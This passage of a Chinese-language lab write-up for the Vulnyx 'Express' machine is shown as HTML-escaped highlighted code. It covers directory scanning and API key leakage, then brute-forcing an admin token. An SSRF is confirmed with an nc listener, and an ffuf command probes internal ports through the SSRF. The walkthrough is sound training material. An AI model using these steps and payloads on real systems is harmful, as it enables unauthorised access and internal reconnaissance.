class=\"hljs-number\"\u003e4.3\u003c/span\u003e\n (\u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e|||\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e) (\u003cspan class=\"hljs-operator\"\u003e/\u003c/span\u003e\u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e||\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003e )\n\nExtensions:php, zip, txt \u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003e\u003cspan class=\"hljs-type\"\u003eHTTP\u003c/span\u003e method:\u003cspan class=\"hljs-type\"\u003eGET\u003c/span\u003e \u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003eThreads:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003e\u003cspan class=\"hljs-type\"\u003eWordlist\u003c/span\u003e size:\u003cspan class=\"hljs-number\"\u003e10439\u003c/span\u003e\n\n\u003cspan class=\"hljs-type\"\u003eOutput\u003c/span\u003e File: \u003cspan class=\"hljs-regexp\"\u003e/root/\u003c/span\u003e\u003cspan class=\"hljs-type\"\u003eDesktop\u003c/span\u003e\u003cspan class=\"hljs-regexp\"\u003e/test/\u003c/span\u003eexpress\u003cspan class=\"hljs-regexp\"\u003e/reports/\u003c/span\u003ehttp_express.nyx\u003cspan class=\"hljs-operator\"\u003e/\u003c/span\u003e_25\u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e21_09\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e.txt\n\nTarget:http:\u003cspan class=\"hljs-comment\"\u003e//express.nyx/\u003c/span\u003e\n\n[\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e] Starting:\n[\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e  308B  \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e \u003cspan class=\"hljs-regexp\"\u003e/css  -\u003e  http:/\u003c/span\u003e\u003cspan class=\"hljs-regexp\"\u003e/express.nyx/\u003c/span\u003ecss\u003cspan class=\"hljs-operator\"\u003e/\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e  315B  \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e \u003cspan class=\"hljs-regexp\"\u003e/javascript  -\u003e  http:/\u003c/span\u003e\u003cspan class=\"hljs-regexp\"\u003e/express.nyx/\u003c/span\u003ejavascript\u003cspan class=\"hljs-operator\"\u003e/\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e  307B  \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003e \u003cspan class=\"hljs-regexp\"\u003e/js  -\u003e  http:/\u003c/span\u003e\u003cspan class=\"hljs-regexp\"\u003e/express.nyx/\u003c/span\u003ejs\u003cspan class=\"hljs-operator\"\u003e/\u003c/span\u003e\n\n\u003cspan class=\"hljs-type\"\u003eTask\u003c/span\u003e \u003cspan class=\"hljs-type\"\u003eCompleted\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-css\"\u003e root\u003cspan class=\"hljs-keyword\"\u003e@kali\u003c/span\u003e  ~/Desktop/test/test  nmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-attribute\"\u003ehttp\u003c/span\u003e://express.nyx\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94S\u003c/span\u003eVN ( \u003cspan class=\"hljs-attribute\"\u003ehttps\u003c/span\u003e://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e03\u003c/span\u003e EST\nPre-scan script \u003cspan class=\"hljs-attribute\"\u003eresults\u003c/span\u003e:\n| \u003cspan class=\"hljs-attribute\"\u003ebroadcast-avahi-dos\u003c/span\u003e:\n|   Discovered \u003cspan class=\"hljs-attribute\"\u003ehosts\u003c/span\u003e:\n|     \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.251\u003c/span\u003e\n|   After NULL UDP avahi packet DoS (CVE-\u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e).\n|_  Hosts are all up (\u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e vulnerable).\nUnable to split netmask from target \u003cspan class=\"hljs-attribute\"\u003eexpression\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://express.nyx\"\u003c/span\u003e\n\u003cspan class=\"hljs-attribute\"\u003eWARNING\u003c/span\u003e: No targets were specified, so \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e hosts scanned.\nNmap \u003cspan class=\"hljs-attribute\"\u003edone\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e IP addresses (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e hosts up) scanned in \u003cspan class=\"hljs-number\"\u003e34.34\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eAPI 接口 信息泄露\u003c/h2\u003e\n\u003cp\u003e存在两个\u003ccode\u003ejavascript\u003c/code\u003e文件夹，我们观察一下加载的\u003ccode\u003ejavascript\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中\u003ccode\u003eapi.js\u003c/code\u003e 出现很多的接口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003egetMusicList\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'/api/music/list'\u003c/span\u003e)\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Music genre list:'\u003c/span\u003e, data);\n        })\n        .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error fetching the music list:'\u003c/span\u003e, error);\n        });\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003egetMusicSongs\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'/api/music/songs'\u003c/span\u003e)\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'List of songs:'\u003c/span\u003e, data);\n        })\n        .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error fetching the list of songs:'\u003c/span\u003e, error);\n        });\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003egetUsersWithKey\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e`/api/users?key=\u003cspan class=\"hljs-subst\"\u003e${secretKey}\u003c/span\u003e`\u003c/span\u003e)\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'User list (with key):'\u003c/span\u003e, data);\n        })\n        .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error fetching the user list:'\u003c/span\u003e, error);\n        });\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003echeckUrlAvailability\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = {\n        \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'http://example.com'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003etoken\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'1234-1234-1234'\u003c/span\u003e\n    };\n\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'/api/admin/availability'\u003c/span\u003e, {\n        \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eheaders\u003c/span\u003e: {\n            \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'application/json'\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-attr\"\u003ebody\u003c/span\u003e: \u003cspan class=\"hljs-title class_\"\u003eJSON\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003estringify\u003c/span\u003e(data)\n    })\n    .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n    .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'URL status:'\u003c/span\u003e, data);\n    })\n    .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error checking the URL availability:'\u003c/span\u003e, error);\n    });\n\t}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要利用的可能是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003egetUsersWithKey\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e`/api/users?key=\u003cspan class=\"hljs-subst\"\u003e${secretKey}\u003c/span\u003e`\u003c/span\u003e)\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n        .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'User list (with key):'\u003c/span\u003e, data);\n        })\n        .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n            \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error fetching the user list:'\u003c/span\u003e, error);\n        });\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003echeckUrlAvailability\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = {\n        \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'http://example.com'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003etoken\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'1234-1234-1234'\u003c/span\u003e\n    };\n\n    \u003cspan class=\"hljs-title function_\"\u003efetch\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'/api/admin/availability'\u003c/span\u003e, {\n        \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eheaders\u003c/span\u003e: {\n            \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'application/json'\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-attr\"\u003ebody\u003c/span\u003e: \u003cspan class=\"hljs-title class_\"\u003eJSON\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003estringify\u003c/span\u003e(data)\n    })\n    .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e =\u003e\u003c/span\u003e response.\u003cspan class=\"hljs-title function_\"\u003ejson\u003c/span\u003e())\n    .\u003cspan class=\"hljs-title function_\"\u003ethen\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u003e\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003elog\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'URL status:'\u003c/span\u003e, data);\n    })\n    .\u003cspan class=\"hljs-title function_\"\u003ecatch\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u003e\u003c/span\u003e {\n        \u003cspan class=\"hljs-variable language_\"\u003econsole\u003c/span\u003e.\u003cspan class=\"hljs-title function_\"\u003eerror\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Error checking the URL availability:'\u003c/span\u003e, error);\n    });\n\t}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们在\u003ccode\u003eKali\u003c/code\u003e开启简易服务器，测试了\u003ccode\u003e/api/admin/availability\u003c/code\u003e 后发现需要\u003ccode\u003etoken\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么\u003ccode\u003e/api/users?key=\u003c/code\u003e 得需要进行模糊测试，但是进行了一段时间的模糊测试后，没测试出来数据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将其改为\u003ccode\u003ePOST\u003c/code\u003e后，就能拿到数据了…\u003c/p\u003e\n\u003cp\u003e泄露的接口上默认没写方法，但是没写默认一般就是\u003ccode\u003eGET\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在拿到的数据最底下能看到有一个用户有两个职能\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e  {\n    \u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"roles\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"editor\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"viewer\"\u003c/span\u003e\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"token\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"9527-1657-3459-4068\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"KerryCa\"\u003c/span\u003e\n  }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们使用它的\u003ccode\u003etoken\u003c/code\u003e来请求\u003ccode\u003e/api/admin/availability\u003c/code\u003e 接口，但还是报错了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将\u003ccode\u003eJson\u003c/code\u003e数据进行处理，然后爆破，最后\u003ccode\u003e4493-3179-0912-0597\u003c/code\u003e 是\u003ccode\u003e200\u003c/code\u003e状态码的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSSRF\u003c/h2\u003e\n\u003cp\u003e再次调用\u003ccode\u003e/api/admin/availability\u003c/code\u003e 接口，成功回显数据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image25.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/test  nc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e让服务器访问\u003ccode\u003ekali\u003c/code\u003e ，能构造\u003ccode\u003eSSRF\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/test  nc -lvnp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e] \u003cspan class=\"hljs-title function_\"\u003efrom\u003c/span\u003e (\u003cspan class=\"hljs-variable constant_\"\u003eUNKNOWN\u003c/span\u003e) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e53416\u003c/span\u003e\n\u003cspan class=\"hljs-variable constant_\"\u003eGET\u003c/span\u003e / \u003cspan class=\"hljs-variable constant_\"\u003eHTTP\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eHost\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eUser\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eAgent\u003c/span\u003e: python-requests/\u003cspan class=\"hljs-number\"\u003e2.32\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eAccept\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eEncoding\u003c/span\u003e: gzip, deflate\n\u003cspan class=\"hljs-title class_\"\u003eAccept\u003c/span\u003e: *\u003cspan class=\"hljs-comment\"\u003e/*\nConnection: keep-alive\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为靶机只有一台机器，所以不会使用\u003ccode\u003eSSRF\u003c/code\u003e去探测内网机器，但是我可以利用他探测内网端口\u003c/p\u003e\n\u003cp\u003e生成\u003ccode\u003e10000\u003c/code\u003e端口字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003eroot@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/test  seq \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e \u003e ports.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003efuff\u003c/code\u003e来模糊测试，发现内网存在\u003ccode\u003e5000\u003c/code\u003e端口和\u003ccode\u003e9000\u003c/code\u003e端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/test  ffuf -H \u003cspan class=\"hljs-string\"\u003e\"Content-Type: application/json\"\u003c/span\u003e -X \u003cspan class=\"hljs-variable constant_\"\u003ePOST\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'{ \"id\":1,\"url\":\"http://127.0.0.1:FUZZ\",\"token\":\"4493-3179-0912-0597\" }'\u003c/span\u003e -u \u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//express.nyx/api/admin/availability -w ports.txt -fw 36\u003c/span\u003e\n\n        \u003cspan class=\"hljs-regexp\"\u003e/'___\\  /\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'___\\           /'\u003c/span\u003e___\\       \n       /\\ \\__/ \u003cspan class=\"hljs-regexp\"\u003e/\\ \\__/\u003c/span\u003e  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-dev\n________________________________________________\n\n :: \u003cspan class=\"hljs-title class_\"\u003eMethod\u003c/span\u003e           : \u003cspan class=\"hljs-variable constant_\"\u003ePOST\u003c/span\u003e\n :: \u003cspan class=\"hljs-variable constant_\"\u003eURL\u003c/span\u003e              : \u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//express.nyx/api/admin/availability\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eWordlist\u003c/span\u003e         : \u003cspan class=\"hljs-attr\"\u003eFUZZ\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/root/\u003c/span\u003e\u003cspan class=\"hljs-title class_\"\u003eDesktop\u003c/span\u003e/test/test/ports.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eHeader\u003c/span\u003e           : \u003cspan class=\"hljs-title class_\"\u003eContent\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eType\u003c/span\u003e: application/json\n :: \u003cspan class=\"hljs-title class_\"\u003eData\u003c/span\u003e             : { \u003cspan class=\"hljs-string\"\u003e\"id\"\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"url\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"http://127.0.0.1:FUZZ\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"token\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"4493-3179-0912-0597\"\u003c/span\u003e }\n :: \u003cspan class=\"hljs-title class_\"\u003eFollow\u003c/span\u003e redirects : \u003cspan 